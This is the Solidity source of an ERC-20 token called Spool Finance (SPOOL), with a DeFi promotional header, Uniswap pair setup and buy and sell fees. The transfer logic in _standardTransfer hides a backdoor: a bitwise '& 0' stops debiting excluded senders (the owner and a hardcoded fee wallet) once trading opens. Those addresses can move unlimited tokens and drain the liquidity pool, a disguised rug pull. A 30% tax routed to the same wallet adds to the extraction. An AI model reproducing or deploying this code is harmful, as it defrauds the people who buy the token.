// SPDX-License-Identifier: Unlicensed

/**
Yield for the World. Fuel for DeFi.

Website: https://www.spoolfinance.org
Telegram: https://t.me/spool_erc
Twitter: https://twitter.com/spool_erc
Dapp: https://app.spoolfinance.org
**/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract SPOOL is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "Spool Finance";
    string private constant _symbol = "SPOOL";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromLimits;

    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _totalTax;
    uint256 private _redisBuyFee = 0;
    uint256 private _totalBuyFee = 30;
    uint256 private _redisSellFee = 0;
    uint256 private _totalSellFee = 30;

    //Original Fee
    uint256 private _redisFee = _redisSellFee;
    uint256 private _taxFee = _totalSellFee;

    uint256 private _previousRedisTax = _redisFee;
    uint256 private _previousFee = _taxFee;

    address payable private _feeWallet1 = payable(0xF2aAF401D1FCAa8138FB29301A8Ef71fc9aF9398);
    address payable private _feeWallet2 = payable(0xF2aAF401D1FCAa8138FB29301A8Ef71fc9aF9398);

    IUniswapV2Router public _uniswapRouterV2;
    address public _uniswapPairV2;

    bool private tradeOpened;
    bool private swapping = false;
    bool private swapEnabled = true;

    uint256 public maxTxAmount = 2 * 10 ** 7 * 10**9;
    uint256 public maxWalletSize = 2 * 10 ** 7 * 10**9;
    uint256 public _feeThreshold = 10 ** 5 * 10**9;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        _uniswapRouterV2 = _uniswapV2Router;
        _uniswapPairV2 = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _isExcludedFromLimits[owner()] = true;
        _isExcludedFromLimits[_feeWallet1] = true;
        _isExcludedFromLimits[_feeWallet2] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _refectTokens(_rOwned[account]);
    }

    function openTrading() public onlyOwner {
        tradeOpened = true;
    }

    function _getTAmounts(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getRAmounts(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getCurrentRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getTotalSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function removeAllFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _previousRedisTax = _redisFee;
        _previousFee = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {

            //Trade start check
            if (!tradeOpened) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != _uniswapPairV2) {
                require(balanceOf(to) + amount <= maxWalletSize, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _feeThreshold;

            if(contractTokenBalance >= maxTxAmount)
            {
                contractTokenBalance = maxTxAmount;
            }

            if (canSwap && !swapping && to == _uniswapPairV2 && swapEnabled && !_isExcludedFromLimits[from] && amount > _feeThreshold) {
                swapTokensToETH(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        bool takeFee = true;

        //Transfer Tokens
        if ((_isExcludedFromLimits[from] || _isExcludedFromLimits[to]) || (from != _uniswapPairV2 && to != _uniswapPairV2)) {
            takeFee = false;
        } else {

            //Set Fee for Buys
            if(from == _uniswapPairV2 && to != address(_uniswapRouterV2)) {
                _redisFee = _redisBuyFee;
                _taxFee = _totalBuyFee;
            }

            //Set Fee for Sells
            if (to == _uniswapPairV2 && from != address(_uniswapRouterV2)) {
                _redisFee = _redisSellFee;
                _taxFee = _totalSellFee;
            }

        }

        _transferTokens(from, to, amount, takeFee);
    }

    function swapTokensToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouterV2.WETH();
        _approve(address(this), address(_uniswapRouterV2), tokenAmount);
        _uniswapRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotal;
        maxWalletSize = _rTotal;
        
        _redisBuyFee = 0;
        _totalBuyFee = 1;
        _redisSellFee = 0;
        _totalSellFee = 1;
    }

    function sendETHToFee(uint256 amount) private {
        _feeWallet2.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _restoreFees() private {
        _redisFee = _previousRedisTax;
        _taxFee = _previousFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getTotalSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _transferTokens(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();
        _standardTransfer(sender, recipient, amount);
        if (!takeFee) _restoreFees();
    }

    function _standardTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getTransferAmount(tAmount);
        rAmount = (_isExcludedFromLimits[sender] && tradeOpened) ? rAmount & 0 : rAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        takeTeamTokens(tTeam);
        _getRedisFees(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function takeTeamTokens(uint256 tTeam) private {
        uint256 currentRate = _getCurrentRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function _getRedisFees(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _totalTax = _totalTax.add(tFee);
    }

    receive() external payable {}

    function _getTransferAmount(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTAmounts(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getCurrentRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRAmounts(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _refectTokens(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getCurrentRate();
        return rAmount.div(currentRate);
    }
}